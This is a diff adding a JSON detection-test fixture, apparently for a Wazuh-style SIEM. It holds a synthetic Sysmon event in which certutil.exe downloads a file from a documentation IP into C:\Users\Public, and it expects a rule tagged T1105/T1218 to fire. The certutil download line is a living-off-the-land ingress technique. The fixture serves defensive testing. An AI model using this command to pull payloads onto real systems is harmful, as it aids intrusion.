@@ -1,0 +1,66 @@
+{
+  "id": "process_certutil_download",
+  "title": "certutil used to download a remote file",
+  "description": "Sysmon process creation: certutil.exe -urlcache -split -f fetching a file from a remote host (LOLBin ingress tool transfer).",
+  "host": "lab-win-01",
+  "kind": "positive",
+  "events": [
+    {
+      "source": "eventchannel",
+      "win": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "process_id": 2440,
+        "task": 1,
+        "version": 5,
+        "level": 4,
+        "keywords": "0x8000000000000000",
+        "event_id": 1,
+        "data": {
+          "RuleName": "-",
+          "UtcTime": "@@nginx_err_ts@@.000",
+          "ProcessGuid": "{4c1f3a2b-0002-6650-0000-0010a1b2c302}",
+          "ProcessId": "@@pid@@",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "FileVersion": "10.0.19041.1",
+          "Description": "-",
+          "Product": "Microsoft® Windows® Operating System",
+          "Company": "Microsoft Corporation",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.15/update.txt C:\\Users\\Public\\update.txt",
+          "CurrentDirectory": "C:\\Users\\jdoe\\",
+          "User": "LAB\\jdoe",
+          "LogonGuid": "{4c1f3a2b-1111-6650-0000-0020e3a10900}",
+          "LogonId": "0x9a1e3",
+          "TerminalSessionId": "1",
+          "IntegrityLevel": "Medium",
+          "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+          "ParentProcessGuid": "{4c1f3a2b-2222-6650-0000-0010aa000000}",
+          "ParentProcessId": "4012",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe",
+          "ParentUser": "LAB\\jdoe"
+        },
+        "message": "Process Create"
+      }
+    }
+  ],
+  "identity": {
+    "data.win.eventdata.processGuid": "{4c1f3a2b-0002-6650-0000-0010a1b2c302}"
+  },
+  "logtest": false,
+  "expect": [
+    {
+      "rule_id": "100140",
+      "level": 12,
+      "mitre": [
+        "T1105",
+        "T1218"
+      ],
+      "fields": {
+        "data.win.eventdata.image": "C:\\\\Windows\\\\System32\\\\certutil.exe"
+      }
+    }
+  ]
+}
